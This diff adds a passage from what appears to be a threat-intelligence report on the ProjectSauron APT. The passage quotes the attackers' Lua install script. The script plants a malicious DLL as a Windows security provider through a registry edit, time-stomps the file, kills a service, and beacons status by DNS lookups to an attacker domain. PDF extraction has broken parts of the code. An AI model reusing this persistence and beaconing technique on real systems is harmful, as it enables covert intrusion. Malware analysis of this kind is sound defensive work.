@@ -1,0 +1,70 @@
+LUA
+The use of a LUA interpreter allowed the attackers to operate with flexibility by writing a simple LUA script
+for a target machine. The original LUA interpreter was modified by the attackers to support Unicode (UTF
+16) string encoding.
+Below is an example of such a script used to install ProjectSauron modules onto the system:
+domain = "bikessport[.]com"
+dllName = "msprtssp.dll"
+install_zeta2 = function ()
+windir = os.getenv("WINDIR")
+execStr = string.format("put2 zeta2dll \" %s \ SYSTEM32 \ %s \" ", windir, dllName)
+res = w.exec2str(execStr)
+if string.find(res, "kb/sec") == nil then
+w.printf("put2 failed \n %s \n ", res)
+return false
+end
+execStr = string.format("nslu gc3220." .. domain)
+w.exec2str(execStr)
+regwrite = false
+regStr = w.exec2str("regedit -r \" HKLM \ System \ CurrentControlSet \ Control \ SecurityProviders \" | grep -i
+SecurityProviders")
+w.printf("regStr %s \n ", regStr)
+for k,v in string.gmatch(regStr, " \" (%w+) \" = \" ([%w,%. ]) \" ") do*
+w.printf("k=%s, v= %s \n ", k, v)
+if string.lower(k) == "securityproviders" then
+if string.len(v)      - 0 then
+value = string.format("%s, %s", v, dllName)
+else
+value = string.format("%s", dllName)
+end
+if not string.find(v, dllName, 1, true) then
+stdIn = string.format("Windows Registry Editor Version
+5.00 \n\n [HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ SecurityProviders] \n\" SecurityProviders \" = \" %s **
+" ", value)
+w.printf(" \n\n stdIn \n %s \n ", stdIn)
+out = w.exec2str("regedit -i", stdIn)
+w.printf(" \n\n out \n %s \n ", out)
+else
+w.printf("Found dllName \n ")
+end
+regwrite = true
+end
+end
+if regwrite == true then
+execStr = string.format("ftime -c \" %s \ SYSTEM32 \ ntdll.dll \" \" %s \ SYSTEM32 \ %s \" ", windir, windir, dllName)
+res = w.exec2str(execStr)
+w.printf("%s \n ", res)
+execStr = string.format("nslu gc3221." .. domain)
+w.exec2str(execStr)
+For any inquiries, contact intelreports@kaspersky.com Page 13 of 22
+The ProjectSauron APT
+end
+return regwrite
+end
+z2res = install_zeta2()
+if not z2res then
+w.printf("Installation failed \n ")
+execStr = string.format("nslu xxc3222." .. domain)
+w.exec2str(execStr)
+else
+str = w.exec2str("plist -b | grep netsvcs")
+pid = string.match(str, "%w (%d+) %w")
+w.debugf("Pid %d \n ", pid)
+w.exec2str(string.format("pkill %d", pid))
+w.printf("Installation done \n ")
+execStr = string.format("nslu ooc3222." .. domain)
+w.exec2str(execStr)
+end
+More LUA examples are shown in ‘Technical Analysis’.
+For any inquiries, contact intelreports@kaspersky.com Page 14 of 22
+The ProjectSauron APT
